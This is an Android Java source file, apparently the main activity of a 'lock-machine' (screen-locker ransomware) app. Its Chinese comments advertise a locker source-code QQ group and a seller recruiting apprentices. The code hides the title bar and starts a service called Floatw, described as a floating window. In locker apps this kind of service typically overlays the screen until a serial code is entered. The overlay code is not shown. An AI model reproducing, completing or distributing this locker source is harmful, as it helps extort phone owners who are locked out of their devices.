package com.dedett.qqzan;

import android.app.*;
import android.os.*;
import android.view.*;
import android.widget.*;
import android.content.*;

public class MainActivity extends Activity
{

    /**
     * 
     锁机源码群30551723

     序列号锁机源码 

     火爆收徒中QQ1576478985

     */
    
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
	{
        super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
 
                setContentView(R.layout.main);
  //启动floatwindow service
// 
  
Intent intent=new Intent().setClass(MainActivity.this,Floatw.class);
startService(intent);
        
        
        
        }
}
